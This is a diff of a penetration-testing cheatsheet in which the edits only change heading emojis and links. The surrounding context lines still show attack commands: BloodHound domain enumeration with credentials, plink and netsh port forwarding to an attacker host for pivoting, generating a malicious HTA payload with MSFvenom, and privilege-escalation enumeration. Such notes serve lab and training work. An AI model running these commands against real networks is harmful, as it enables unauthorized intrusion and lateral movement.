@@ -4,7 +4,7 @@
 
 ## Summary
 
-1. [Common tasks](#user-content-️-common-tasks)
+1. [Common tasks](#user-content-️-common-taskstools)
 2. [Common services/ports](#user-content--common-servicesports)
 3. [Windows](#windows)
 4. [Linux](#-linux)
@@ -899,7 +899,7 @@ bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -c all -ns $TARGET
 > [Windows Privesc notes](https://github.com/amirr0r/notes/blob/master/Windows/Privesc.md#windows-privesc)
  
 
-### 🥸 Enumeration
+### 🕵️ Enumeration
 
 - List information about current: `net user <username>`
 - List groups I belonged to: `net user /domain <username>`
@@ -1222,14 +1222,14 @@ plink.exe -L $VICTIM_IP:$VICTIM_PORT:$ATTACKER_IP:$ATTACKER_PORT kali@$ATTACKER_
 netsh interface portproxy add v4tov4 listenport=$PORT listenaddress=$IP connectport=$PORT connectaddress=$IP
 ```
 
-## 🕵️ Client-side attack
+## 🤠 Client-side attack
 
 ### 🖱️HTA application
 
 > Files with the extension `.hta` are automatically executed by the **Internet Explorer** (IE) browser as HTML application (via **`mshta.exe`**).
  
 
-💡 We can use `MSFvenom` to generate a HTA malicious application [Link]
+💡 We can use `MSFvenom` to generate a HTA malicious application [Link](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#msfvenom)
 
 ⚠️ If we visit a URL containing a HTML application, IE will trigger two popups. One that asks us if we want to open or save the file. Another security warning to inform the application will be opened outside the Protected mode.
 
@@ -1559,7 +1559,7 @@ mount -t nfs -o vers=2 $TARGET:/$DIRECTORY /mnt/$DIRECTORY
 > [Linux Privesc notes](https://github.com/amirr0r/notes/blob/master/Linux/Privesc.md#privesc)
  
 
-### 🥸 Enumeration
+### 🕵️ Enumeration
 
 - Current user groups: `id`
     - `sudo -l` list sudo config/program a user is allowed to run (if in **sudoers**)
